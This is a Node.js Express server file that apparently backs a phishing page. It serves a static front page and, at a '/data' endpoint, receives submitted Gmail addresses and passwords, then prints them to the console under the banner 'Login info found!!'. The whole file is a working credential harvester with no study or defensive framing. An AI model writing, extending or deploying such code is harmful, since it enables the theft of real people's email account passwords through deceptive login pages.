const express = require("express")
const path = require("path")
const app = express()
let port = process.env.PORT || 8080

app.use(express.static(__dirname+'/files'))
app.get("/",function(req,res){
    res.sendFile(path.join(__dirname+'/files/index.html'))
})
app.use(express.json())
app.post("/data", function(req,res){
    let gmail = req.body.GMAIL
    let password = req.body.PASSWORD
    FgBlack = "\x1b[30m"
    FgRed = "\x1b[31m"
    FgGreen = "\x1b[32m"
    FgYellow = "\x1b[33m"
    FgBlue = "\x1b[34m"
    FgMagenta = "\x1b[35m"
    FgCyan = "\x1b[36m"
    FgWhite = "\x1b[37m"
    console.log(FgCyan,"[!] Login info found!!")
    console.log(FgGreen,"[*] Gmail: ")
    console.log(FgYellow, gmail)
    console.log(FgGreen,"[*] Password: ")
    console.log(FgYellow, password)
})

app.listen(port)
console.log("Listening on " + port + "..." + " http://localhost:" + port)

app.listen()
